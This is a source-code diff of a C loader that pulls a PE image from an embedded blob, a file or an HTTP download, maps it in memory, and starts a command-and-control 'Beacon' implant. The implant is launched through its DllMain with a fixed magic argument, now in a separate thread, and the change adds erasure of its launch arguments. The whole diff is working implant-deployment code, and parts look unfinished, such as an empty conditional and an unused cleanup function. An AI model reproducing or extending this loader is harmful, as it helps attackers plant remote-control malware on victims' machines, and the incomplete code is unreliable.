@@ -8,13 +8,23 @@
 #include "pe_loader.h"
 #include "boot.h"
 
-static Runtime_M* initRuntime(void* boot, Runtime_Opts* opts);
-static uint32     pe_loader_size();
+#define BOOT_MODE_V1 1
+
+typedef struct {
+    Runtime_M*  runtime;
+    PELoader_M* loader;
+    uint32      mode;
+} BootCtx;
+
+static DWORD bootBeacon(BootCtx* ctx);
 
 static void* loadImage(Runtime_M* runtime);
 static void* loadImageFromEmbed(Runtime_M* runtime, byte* config);
 static void* loadImageFromFile(Runtime_M* runtime, byte* config);
 static void* loadImageFromHTTP(Runtime_M* runtime, byte* config);
+
+static Runtime_M* initRuntime(void* boot, Runtime_Opts* opts);
+static uint32     pe_loader_size();
 
 errno Boot(void* ctx)
 {
@@ -28,21 +38,35 @@ errno Boot(void* ctx)
     // reserved context and extended arguments
     (void)ctx;
 
+    // process arguments
+    bool wait = false;
+
     // initialize PE Loader and load image
-    uint16 version;
     PELoader_M* loader = NULL;
     errno err = NO_ERROR;
     for (;;)
     {
         // check the Beacon version
+        uint16 version;
         if (!runtime->Argument.GetValue(ARG_ID_VERSION, &version, NULL))
         {
             err = ERR_NOT_FOUND_VERSION;
             break;
         }
-        if (version < 0x0400) // v4.0
+        uint32 mode = 0;
+        if (version >= 0x0400 && version < 0x0500)
+        {
+            mode = BOOT_MODE_V1;
+        }
+        if (mode == 0)
         {
             err = ERR_UNSUPPORTED_VERSION;
+            break;
+        }
+        // get test option
+        if (!runtime->Argument.GetValue(ARG_ID_TEST_WAIT, &wait, NULL))
+        {
+            err = ERR_NOT_FOUND_TEST_WAIT;
             break;
         }
         // load PE Image, it cannot be empty
@@ -66,8 +90,29 @@ errno Boot(void* ctx)
             break;
         }
         runtime->Memory.Free(image);
-        // initialize dll before start beacon
+        mem_init(&config, sizeof(config));
+        // initialize dll before boot beacon
         err = loader->Execute();
+        if (err != NO_ERROR)
+        {
+            break;
+        }
+        // create thread for boot beacon stage
+        BootCtx* context = runtime->Memory.Alloc(sizeof(BootCtx));
+        context->runtime = runtime;
+        context->loader  = loader;
+        context->mode    = mode;
+        void* address = GetFuncAddr(&bootBeacon);
+        HANDLE hThread = runtime->Thread.New(address, context, true);
+        if (hThread == NULL)
+        {
+            err = GetLastErrno();
+            break;
+        }
+        if (!wait)
+        {
+            
+        }
         break;
     }
     if (err != NO_ERROR || loader == NULL)
@@ -76,22 +121,13 @@ errno Boot(void* ctx)
         return err;
     }
 
-    // call beacon entry point and it will be blocked
-    switch (version)
-    {
-    case 0x0400:
-        DllMain_t dllMain = (DllMain_t)(loader->EntryPoint);
-        HMODULE   hModule = (HMODULE)(loader->ImageBase);
-        if (!dllMain(hModule, 4, (LPVOID)(0x56A2B5F0)))
-        {
-            err = ERR_CALL_BEACON_ENTRY_POINT;
-        }
-        break;
-    default:
-        panic(PANIC_UNREACHABLE_CODE);
-    }
-    runtime->Argument.EraseAll();
 
+
+
+    if (!wait)
+    {
+        return NO_ERROR;
+    }
     // destroy pe loader and exit runtime
     errno eld = loader->Destroy();
     if (eld != NO_ERROR && err == NO_ERROR)
@@ -99,6 +135,31 @@ errno Boot(void* ctx)
         err = eld;
     }
     return err;
+}
+
+static DWORD bootBeacon(BootCtx* ctx)
+{
+    // copy context and free it
+    Runtime_M*  runtime = ctx->runtime;
+    PELoader_M* loader  = ctx->loader;
+    uint32 mode = ctx->mode;
+    runtime->Memory.Free(ctx);
+
+    // call beacon entry point and it will be blocked
+    switch (mode)
+    {
+    case BOOT_MODE_V1:
+        DllMain_t dllMain = (DllMain_t)(loader->EntryPoint);
+        HMODULE   hModule = (HMODULE)(loader->ImageBase);
+        if (!dllMain(hModule, 4, (LPVOID)(0x56A2B5F0)))
+        {
+             return ERR_CALL_BEACON_ENTRY_POINT;
+        }
+        break;
+    default:
+        panic(PANIC_UNREACHABLE_CODE);
+    }
+    return 0;
 }
 
 static void* loadImage(Runtime_M* runtime)
@@ -113,11 +174,6 @@ static void* loadImage(Runtime_M* runtime)
     if (config == NULL || size == 0)
     {
         SetLastErrno(ERR_EMPTY_PE_IMAGE_DATA);
-        return NULL;
-    }
-    if (size < 1)
-    {
-        SetLastErrno(ERR_INVALID_IMAGE_CONFIG);
         return NULL;
     }
     byte mode = *config;
@@ -213,6 +269,29 @@ static void* loadImageFromHTTP(Runtime_M* runtime, byte* config)
     }
     runtime->WinHTTP.FreeDLL();
     return resp.Body.buf;
+}
+
+static errno eraseArguments(Runtime_M* runtime)
+{
+    uint32 id[] = 
+    {
+        ARG_ID_VERSION,
+        ARG_ID_PE_IMAGE,
+        ARG_ID_TEST_WAIT,
+    };
+    bool success = true;
+    for (int i = 0; i < arrlen(id); i++)
+    {
+        if (!runtime->Argument.Erase(id[i]))
+        {
+            success = false;   
+        }
+    }
+    if (success)
+    {
+        return NO_ERROR;
+    }
+    return ERR_ERASE_ARGUMENTS;
 }
 
 static Runtime_M* initRuntime(void* boot, Runtime_Opts* opts)
